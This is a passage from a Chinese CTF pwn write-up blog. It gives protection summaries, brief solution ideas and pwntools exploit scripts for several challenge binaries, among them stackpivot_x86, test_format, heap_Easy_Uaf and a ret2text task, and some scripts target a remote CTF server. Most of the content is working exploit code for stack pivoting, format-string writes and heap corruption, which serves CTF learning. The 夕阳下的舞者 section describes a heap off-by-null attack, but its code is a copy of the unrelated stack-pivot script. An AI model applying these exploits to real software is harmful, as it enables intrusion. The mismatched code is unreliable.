p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="stackpivot-x86"><a href="#stackpivot-x86" class="headerlink" title="stackpivot_x86"></a>stackpivot_x86</h2><h3 id="程序保护-10"><a href="#程序保护-10" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>栈迁移蛮有意思的，结构b’a’*padding + p64(goal) + p64(leave_ret)，通过执行两次 leave ; ret 将栈迁移到目标位置</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebp距离输入地址的值</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#泄露ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#计算ebp 和 输入 的距离</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h2 id="夕阳下的舞者"><a href="#夕阳下的舞者" class="headerlink" title="夕阳下的舞者"></a>夕阳下的舞者</h2><h3 id="程序保护-11"><a href="#程序保护-11" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目主要类型为offbynull制造堆块重叠，函数结构比较复杂，需要ida逆向理清，这里提供简单思路</p>
<ul>
<li>Step1：泄露libc基址。申请chunk，正常释放，大于fastbin的chunk会被放入unsortedbin中，且fd和bk均指向于main_arena_88的位置，可以获得libc基址</li>
<li>Step2：泄露堆地址。为啥泄露堆地址，因为开启了PIE，创建2个不相邻的 small chunk，释放后会放到 unsoted bin 中，通过打印函数可以泄露地址。</li>
<li>Step3：off-by-null，getshell 利用off-by-null漏洞制造堆块重叠，用fastbin去申请mallochook-0x23位置的一个chunk去修改mallochook为og</li>
</ul>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebp距离输入地址的值</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#泄露ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#计算ebp 和 输入 的距离</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h2 id="test-format"><a href="#test-format" class="headerlink" title="test_format"></a>test_format</h2><h3 id="程序保护-12"><a href="#程序保护-12" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p>格式化字符串漏洞，修改任意位置的值</p>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2121</span>)<br><span class="hljs-comment">#p = process('./test_format')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./test_format'</span>)<br><br>goal = <span class="hljs-number">0x0804A030</span><br>payload = <span class="hljs-string">'aaaa%8$n'</span> + p64(goal)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="heap-Easy-Uaf"><a href="#heap-Easy-Uaf" class="headerlink" title="heap_Easy_Uaf"></a>heap_Easy_Uaf</h2><h3 id="程序保护-13"><a href="#程序保护-13" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h3><p>漏洞存在于Are()函数中，函数malloc了一个0x71大小的堆块，但是并没有清0，存在释放后使用的可能性。在之后申请了一个chunk b，chunk b的内容存在堆溢出。我这里的思路就是如果在a的上方有个大小小于0x71，释放的chunk，程序会将b申请到a的上方，这样通过堆溢出可以修改a的内容为”Flag”，官方做法是直接 将申请的b在a中，填写b的内容为Flag也可以！</p>
<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2094</span>)<br><span class="hljs-comment">#p = process('./heap_Easy_Uaf')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./heap_Easy_Uaf'</span>)<br><span class="hljs-comment">#heaparray = 0x602100</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">amaze</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"5"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Chunk size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Please Input Content : \n'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"6"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><br>heap_ptr = <span class="hljs-number">0x602100</span><br>shell=<span class="hljs-number">0x400A16</span><br><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#debug()</span><br>amaze(<span class="hljs-number">8</span>,<span class="hljs-string">''</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>pay = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">"Flag"</span><br>amaze(<span class="hljs-number">8</span>,pay)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="小狗汪汪汪"><a href="#小狗汪汪汪" class="headerlink" title="小狗汪汪汪"></a>小狗汪汪汪</h2><h3 id="程序保护-14"><a href="#程序保护-14" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2text</p>
<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2133</span>)<br><span class="hljs-comment">#p = process('./woof')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br><br>backdoor = <span class="hljs-number">0x0804859B</span><br>p.recvuntil(<span class="hljs-string">b'This puppy needs to eat a few bones?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x9</span>+<span class="hljs-number">4</span>) + p32(<span class="hljs-number">0x0804859B</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>





<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/">← Next 移动开发实验1：类微信界面</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/">常见文件文件头和隐写术总结 CTF中Misc必备 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#emo-chunk"><span class="toc-number">1.1.</span> <span class="toc-text">emo_chunk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#double-free"><span class="toc-number">1.2.</span> <span class="toc-text">double  free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easychunk"><span class="toc-number">1.3.</span> <span class="toc-text">easychunk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fish"><span class="toc-number">1.4.</span> <span class="toc-text">fish</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#format-ret2libc"><span class="toc-number">1.5.</span> <span class="toc-text">format_ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">1.5.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Game"><span class="toc-number">1.6.</span> <span class="toc-text">Game</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-number">1.6.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#name4"><span class="toc-number">1.7.</span> <span class="toc-text">name4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-6"><span class="toc-number">1.7.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#play"><span class="toc-number">1.8.</span> <span class="toc-text">play</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-7"><span class="toc-number">1.8.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.9.</span> <span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-8"><span class="toc-number">1.9.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-8"><span class="toc-number">1.9.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-8"><span class="toc-number">1.9.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep"><span class="toc-number">1.10.</span> <span class="toc-text">sleep</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-9"><span class="toc-number">1.10.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-9"><span class="toc-number">1.10.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-9"><span class="toc-number">1.10.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stackpivot-x86"><span class="toc-number">1.11.</span> <span class="toc-text">stackpivot_x86</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-10"><span class="toc-number">1.11.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-10"><span class="toc-number">1.11.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-10"><span class="toc-number">1.11.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85"><span class="toc-number">1.12.</span> <span class="toc-text">夕阳下的舞者</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-11"><span class="toc-number">1.12.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-11"><span class="toc-number">1.12.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-11"><span class="toc-number">1.12.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#test-format"><span class="toc-number">1.13.</span> <span class="toc-text">test_format</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-12"><span class="toc-number">1.13.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-12"><span class="toc-number">1.13.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-12"><span class="toc-number">1.13.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap-Easy-Uaf"><span class="toc-number">1.14.</span> <span class="toc-text">heap_Easy_Uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-13"><span class="toc-number">1.14.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 